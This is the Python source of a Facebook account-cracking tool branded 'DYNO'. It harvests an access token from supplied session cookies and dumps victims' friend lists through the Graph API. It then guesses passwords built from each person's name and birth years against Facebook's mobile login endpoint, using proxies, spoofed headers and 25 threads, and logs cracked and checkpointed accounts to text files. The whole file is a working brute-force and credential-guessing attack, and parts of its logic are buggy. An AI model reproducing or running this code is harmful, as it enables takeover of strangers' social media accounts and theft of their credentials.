
#1,.1111

def clear():
	os.system("clear")

import sys , time , os 
from concurrent.futures import ThreadPoolExecutor
try:
	import random , re , base64 , requests , user_agent
except:
	os.system("pip install regex")
	os.system("pip install requests")
	os.system("pip install user_agent")
	print("[ + ] Run Tool Again")
import random , re , base64 , requests , user_agent
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except:
	print("[ - ] Erorr")
	sys.exit()
user_a = []
for i in range(100):
	user_a.append(user_agent.generate_user_agent())


TOKEN = ""
COOKIES = ""
def write(z , s=0.001):
	for i in z + "\n":
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(s)
####################
ids_ = []
type_protocol = ""
password_list = []
id_limit = 0
name = ""
ids = []
loop = 0
ok = 0
cp = 0
#####################
B = "\u001b[34;1m"
R = "\u001b[31;1m"
G = "\u001b[32;1m"
Y = "\u001b[33;1m"
RR = "\u001b[0m"
#####################
ses = requests.Session()
def c1():
	da = random.randint(1,3)
	if da == 1:
		return G
	if da == 2:
		return B
	if da == 3:
		return R
	else:
		return G


ban1 = f'''{c1()}
██████╗ ██╗   ██╗███╗   ██╗ ██████╗ 
██╔══██╗╚██╗ ██╔╝████╗  ██║██╔═══██╗
██║  ██║ ╚████╔╝ ██╔██╗ ██║██║   ██║
██║  ██║  ╚██╔╝  ██║╚██╗██║██║   ██║
██████╔╝   ██║   ██║ ╚████║╚██████╔╝
╚═════╝    ╚═╝   ╚═╝  ╚═══╝ ╚═════╝{RR} 
{R}╔════════════════════════════════════════╗  
{R}║ {RR}Owner  : {R}@DYNO_1668                    ║
{R}║ {RR}Github : {G}https://github.com/{R}DYNOHACKER{R} ║
{R}║ {RR}ADMIN  : {R}@i4m_maro{R}                     ║
{R}║ {RR}Created By : {R}@M_MAJIC_C{R}                ║
{R}╚════════════════════════════════════════╝{RR}'''


#--




attempt = 1
def a_login():
	clear()
	global name
	global COOKIES
	global TOKEN
	TOKEN,COOKIES= "",""
	global attempt

	cok_file = open(".cok.txt" , "r").read()
	clear()
	print(ban1)
	print(f"{Y}[ ! ] {c1()}{attempt}{RR}")
	print(Y + cok_file)
	
	data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cok_file}) 
	find_token = re.search("(EAAG\w+)", data.text)
	attempt += 1
	try:
		TOKEN  = find_token.group(1)
		COOKIES = cok_file
	except:
		print(f"{R}[ - ] Failed")
		if attempt == 3:
			if os.path.exists(".cok.txt"):
				os.remove(".cok.txt")
			c_login()
		else:
			a_login()
			attempt += 1
	print(f"{G}[ ⇋ ] Success Login{RR}")
	time.sleep(2)
	if os.path.exists(".cok.txt"):
		os.remove(".cok.txt")
	cok=open(".cok.txt", "w").write(cok_file)
	menu()

	
	attempt += 1

###########################
def friends_clone():
	ids.clear()
	global loop ,ok , cp
	loop,cp,ok = 0,0,0
	global type_protocol
	type_protocol = ""
	global COOKIES
	global TOKEN
	total_dump = 0
	

	global id_limit
	clear()
	print(ban1)
	try:
		id_limit = int(input(f"[ ? ] How Much Id For Crack ? [{R}10{RR}] ══> "))
	except ValueError:
		print(f"{R}[ ? ] Erorr{RR}")
		time.sleep(1)
		friends_clone()

	if id_limit <= 0 or id_limit > 10:
		print(f"{R}[ ? ] Erorr{RR}")
		time.sleep(1)
		friends_clone()
	
	for i in range(id_limit):
		fail_check = 1
		total_dump = 0
		i += 1
		proxy = random.choice(prox)
		proxs= {'http': 'https://'+proxy}
		
		while fail_check == 1:
			id = input(f"[ {str(i)} ] ID ══> ")
			dat = ses.get('https://graph.facebook.com/v1.0/'+id+'?fields=friends.limit(9999)&access_token='+TOKEN, cookies = {'cookies':COOKIES} , proxies=proxs).json()
			try:
				if 368 in dat["code"]:
					print(f"{R}[ ! ] Blocked{RR}") 
			except KeyError:
				pass
			try:
				for t in dat['friends']['data']:
					ids.append(t["id"] +"|"+t["name"])
					ids_.append(t["id"])
					total_dump += 1 
				
				print(f"{G}[ + ] Dump : {c1()}{str(total_dump)}{RR}")
				fail_check = 0
			except KeyError:
				print(f"{R}[ ! ] Failed Dump{RR}")

	print(f'''{R}╭──────────{G}Protocol{R}──────────╮
{R}│{G} [ 1 ] Mobile{R}               │
{R}│{G} [ 2 ] Normal (Fast){R}        │ 
{R}╰────────────────────────────╯''')
	choice = input(f"{R}Dyno{RR} ══>{c1()}")
	if choice == "1" or "01":
		type_protocol = "mobile"
	elif choice == "2" or "02":
		type_protocol = "normal"
	print(f'''
{R}╭──────────{G}Passwords{R}────────────╮
{R}│{B} [ 1 ] Choice Pass (7){R}         │ 
{R}│{B} [ 2 ] All pass Is Here{R}        │ 
{R}╰───────────────────────────────╯''')
	choice = str(input(f"{R}Dyno{RR} ══>{c1()}"))
	if choice == "1" or choice == "01":
		choice_password()
	elif choice == "2" or choice == "02":
		all_pass()

def all_pass():
	pwv = []
	pwv.clear()
	clear()
	print(ban1)
	write(f"[ + ] Password-Type : All Password")
	write(f"{G}[ + ] OK {B}Saved in {RR}:{G} OK_DYNO.txt")
	write(f"{Y}[ + ] CP {B}Saved in {RR}:{Y} CP_DYNO.txt")
	write(f"{G}[ + ] Crack Started")
	write(f"{G}[ ! ] To Stop CTRL+Z")
	write(f"---------------------------------{RR}")
	with ThreadPoolExecutor(max_workers=25) as g:
		for yuzong in ids:
			nm=""
			birth = 1999
			pwv = []
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			lsn = nmf.split(' ')[1]
			if len(frs) > 3:
				nm=frs
			elif len(lsn) > 3:
				nm=lsn
			else:
				nm=frs+lsn
			pwv.append(frs + lsn)
			pwv.append(frs)
			pwv.append(nm+"123")
			pwv.append(nm+"1234")
			pwv.append(nm+"12345")
			pwv.append(nm+"123456")
			pwv.append(nm+"1234567")
			pwv.append(nm+"12345678")
			pwv.append(nm+"123456789")
			pwv.append(nm+"112233")
			pwv.append(nm+"11223344")
			pwv.append(nm+"123123")
			pwv.append(nm+frs)
			pwv.append(nm+lsn)
			pwv.append(nm+birth)
			for i in range(10):
				birth += 1
				pwv.append(nm+birth)
			pwv.append("1234567")
			pwv.append("12345678")
			pwv.append(frs+frs+"123")
			pwv.append(frs+frs)
			pwv.append(lsn+lsn)
			pwv.append(lsn+lsn+frs)
			pwv.append(frs+lsn+lsn)
			g.submit(api_1,idf,pwv,nmf)
	input(f"\n{G}[ + ] Crack Complate ....")
	menu()
##########+#+#+#++#+#+#+
def choice_password():
	clear()
	print(ban1)
	for i in range(7):
		i += 1
		pass_ = input(f"[ {c1()}{str(i)}{RR} ] Password ══> ")
		password_list.append(pass_)
	write(f"{G}[ + ] OK {B}Saved in {RR}:{G} OK_DYNO.txt")
	write(f"{Y}[ + ] CP {B}Saved in {RR}:{Y} CP_DYNO.txt")
	write(f"{G}[ + ] Crack Started")
	write(f"{G}[ ! ] To Stop CTRL+Z")
	write(f"---------------------------------{RR}")

	with ThreadPoolExecutor(max_workers=25) as thread:
		for id in ids:
			ad = id.split("|")[0]
			nmf = id.split("|")[1]
			thread.submit(api_1 , ad, password_list , nmf)

##################
def menu():
	clear()
	global name
	print(ban1)
	print(f"╔══════════MENU══════════╗")
	print(f"║ {G}[ 01 ] Clone Friends{RR}   ║")
	print(f"║ {R}[ 88 ] {R}Logout{RR}          ║")
	print(f"║ {R}[ 99 ] {R}Exit{RR}    	 ║")	
	print(f"╚════════════════════════╝")
	choice = input(f"╚═{G}DYNO{RR}══>{c1()} ")
	if choice == "01" or choice == "1":
		friends_clone()
	if choice == "99":
		print(f"{R}[ ! ] Exit{RR}")
		time.sleep(2)
		sys.exit()
	if choice == "99":
		print(f"{R}[ ! ] Logout{RR}")
		time.sleep(2)
		os.remove(".cok.txt")
		c_login()
	else:
		print(f"{R}[ ! ] WRONG CHOICE")
		time.sleep(2)
		menu()

def c_login():
	clear()
	if os.path.exists(".cok.txt"):
		a_login()

	#╔═╗
	#║ ║
	#╚═╝
	print(ban1)
	coki = input(f"{RR}{Y}Cookies{RR} ══> {c1()}")
	data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":coki}) 
	find_token = re.search("(EAAG\w+)", data.text)
	try:
		cok  = find_token.group(1)
	except:
		print(f"{R}[ - ] Failed")
		time.sleep(1)
		c_login()
	time.sleep(1)
	if os.path.exists(".cok.txt"):
		os.remove(".cok.txt")
	
	print(f"{G}[ ⇋ ] Success Login{RR}")
	cok=open(".cok.txt", "w").write(coki)
	menu()



def api_1(arg , p , name):
	global ok
	global cp
	global loop
	ua1 = random.choice(user_a)
	ua2 = random.choice(user_a)
	user = arg
	pas = p
	try:
		os.mkdir("save")
	except OSError:
		pass
	print(f"\r{G}[𝐃𝐘𝐍𝐎] {c1()}{str(loop)}/{str(len(ids))} {G}OK/{str(ok)} {RR}{Y}CP/{str(cp)}",end="");sys.stdout.flush()
		#100074579974053
	ses = requests.Session()
	for pws in pas:
		if len(user) < 6:
			break				
		headers_ = {
		"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
		"x-fb-sim-hni": str(random.randint(20000, 40000)), 
		"x-fb-net-hni": str(random.randint(20000, 40000)), 
		"x-fb-connection-quality": "EXCELLENT",
		"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
		"user-agent": ua2, 
		"content-type": "application/x-www-form-urlencoded", 
		"x-fb-http-engine": "Liger"
		}
		
		try:
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(user)+"&password="+str(pws)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers_)
		except requests.exceptions.ConnectionError:
			time.sleep(3)
		
		try:
			if 613 == response.json()["error_code"]:
				break
		except:
			pass
		
		if "session_key" in response.text and "EAAA" in response.text:
			a = f'''
==========DUSKY-OK==========\n
Name     : {name}
PassWord : {pws}
ID       : {user}


'''
			print("\n")
			print(f"{G}══════════[𝐃𝐘𝐍𝐎➱OK]══════════\nName : {name}\nPassWord : {pws}\nID : {user}\n══════════[𝐃𝐘𝐍𝐎➱OK]══════════{RR}")
			open("OK_DYNO.txt" , "a").write(a)
			ok += 1
			loop += 1
			break
		elif "www.facebook.com" in response.json()["error_msg"]:
			a = f'''
==========DUSKY-CP==========\n
Name     : {name}
PassWord : {pws}
ID       : {user}'''
			print(f"{Y}══════════[𝐃𝐘𝐍𝐎➱CP]══════════\nName : {name}\nPassWord : {pws}\nID : {user}\n══════════[𝐃𝐘𝐍𝐎➱CP]══════════{RR}")
			open("CP_DYNO.txt" , "a").write(a)
			cp += 1
			break
	loop +=1 

try:
	data = requests.get("https://raw.githubusercontent.com/sizar78/config/main/Keys")
except:
	print(f"{R}[ ! ] Error")
	sys.exit()
#id
uuid = str(os.getlogin())
uid1 = "-_".join(uuid)
idu=uid1
uiid = idu.encode("ascii")
base64_id = base64.b64encode(uiid)
uid = base64_id.decode("ascii")

write(ban1)
print(f"{RR}[ ? ] YOUR ID : {Y}{uid}{RR}")
if uid == uid:
	print(f"{G}[ + ] Your Id is Active !")
	time.sleep(1.5)
	c_login()
else:
	input(f"{R}[ - ] Your Id Is Not Active To {G}Active{R} Id Send {G}@DYNO_1668{RR}")



